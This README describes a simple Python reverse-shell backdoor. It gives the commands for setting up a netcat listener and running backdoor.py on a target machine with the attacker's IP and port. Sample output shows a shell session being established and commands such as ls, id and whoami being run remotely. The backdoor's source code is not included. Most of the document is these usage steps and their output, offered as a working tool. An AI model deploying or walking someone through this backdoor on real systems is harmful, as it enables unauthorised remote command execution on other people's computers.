Simple backdoor implementation that requires the user to set the listening machine's IP/PORT manually. In order for this to work the listening machine has to set up a listener (for example netcat):
```
nc -vv -l -p [PORT]
```
Then on the target machine:
```
python backdoor.py -i [IP] -p [PORT]
```
or
```
python backdoor.py --ip [IP] --port [PORT]
```
ex.
```
nc -vv -l -p 1234
listening on [any] 1234 ...
```
```
python backdoor.py -i 192.168.1.13 -p 1234
```
This should result in a connection between the two machines and allow us to remotely execute shell commands:
```
connect to [192.168.1.13] from pc1.home [192.168.1.10] 60936

[+] Connection established
ls
backdoor.py
venv
id
uid=1000(haf) gid=1000(haf) groups=1000(haf),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),129(libvirt)
whoami
haf
``` 
